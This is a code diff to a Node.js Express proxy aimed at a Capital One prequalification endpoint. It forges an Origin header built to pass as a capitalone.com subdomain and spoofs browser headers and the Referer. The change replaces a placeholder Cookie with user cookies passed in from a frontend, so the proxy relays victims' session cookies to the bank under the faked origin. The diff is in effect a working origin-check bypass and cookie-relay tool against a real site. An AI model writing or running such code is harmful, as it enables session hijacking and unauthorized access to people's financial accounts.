@@ -7,18 +7,18 @@ const app = express();
 app.use(cors());  // Enable CORS for all routes
 app.use(express.json());
 
-// Proxy route to forward requests with modified Origin header and browser-like headers
+// Proxy route to forward requests with modified Origin header and user cookies
 app.post('/proxy', (req, res) => {
-  const { targetUrl } = req.body;
+  const { targetUrl, userCookies } = req.body;  // Get target URL and user's cookies from frontend
 
   // Define request options (headers, method, etc.)
   const requestOptions = {
     method: 'GET',
     headers: {
-      'Origin': 'https://chinamayjoshi.xyz?#xyz.capitalone.com',  // Updated fake origin
+      'Origin': 'https://chinamayjoshi.xyz?#xyz.capitalone.com',  // Fake origin
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
-      'Accept': '*/*',  // Accept all content types, remove Accept-Encoding
-      'Cookie': '<insert-your-cookie-here>',  // Optionally add cookies if needed
+      'Accept': '*/*',  // Accept all content types
+      'Cookie': userCookies,  // Include user's cookies dynamically
       'Referer': 'https://coaf-prequalification.capitalone.com/',
       'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"',
       'Sec-Ch-Ua-Platform': 'Windows',
